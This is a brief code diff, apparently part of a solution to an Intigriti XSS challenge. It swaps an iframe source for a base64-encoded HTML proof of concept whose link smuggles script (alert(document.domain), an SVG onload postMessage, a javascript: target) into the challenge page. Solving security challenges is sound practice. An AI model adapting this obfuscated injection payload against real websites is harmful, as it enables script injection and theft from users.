@@ -4,7 +4,7 @@
   <script>
     var iframe = document.createElement('iframe');
     iframe.name = 'helloworld';
-    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png'
+    iframe.src = 'data:text/html;base64,PGEgaHJlZj0iaHR0cHM6Ly9jaGFsbGVuZ2UuaW50aWdyaXRpLmlvLzEvI2RhdGE6dGV4dC9odG1sLC8qJTI1M0NzdmclMjBvbmxvYWQ9JTIycGFyZW50LnBvc3RNZXNzYWdlKHt9LCcqJyklMjI7JTI1M0UqLzE7dmFyJTIwdGV4dD0xLGh0bWw9MjthbGVydChkb2N1bWVudC5kb21haW4pOyIgdGFyZ2V0PSJqYXZhc2NyaXB0OmFsZXJ0KDEpIj5Qb0M8L2E+'
     
     iframe.onclick = function(e){
       window.open(this.contentWindow.name, this.src);
